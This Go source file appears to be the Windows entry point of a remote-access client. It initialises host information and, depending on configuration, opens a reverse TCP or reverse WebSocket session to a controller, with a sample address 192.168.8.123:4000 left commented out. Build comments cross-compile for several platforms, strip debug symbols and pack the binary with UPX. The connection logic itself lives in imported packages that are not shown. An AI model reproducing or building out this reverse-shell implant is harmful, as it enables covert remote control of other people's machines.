//go:build windows

package main

// var host = "192.168.8.123" // assuming for the sake of example
// var port = "4000"

import (
	"main/PcInfo"
	Protocol "main/Protocol/windows"
)

func main() {

	PcInfo.GroupInfo = "Windows"
	PcInfo.Init()
	switch PcInfo.Protocol {
	case "Session/Reverse_tcp":
		{
			Protocol.TcpRun()
		}

	case "Session/Reverse_Ws":
		{
			Protocol.WsRun()
		}

	}
}

//cmd:
//Linux：
//set GOOS=linux
//set GOARCH=amd64

//windows:
//set GOOS=windows
//set GOARCH=amd64

//powershell:
//Linux:
//$env:GOOS="linux"
//$env:GOARCH="amd64"
//Windows:
//$env:GOOS="windows"
//$env:GOARCH="amd64"

//CGO_ENABLED=0 GOOS=linux go build -a -ldflags="-s -w" -installsuffix cgo -o Winmain.exe main.go && upx -9 Client
//set GOARCH=mips
//set GOOS=linux

//MacOS
//set GOOS=darwin
//set GOARCH=amd64
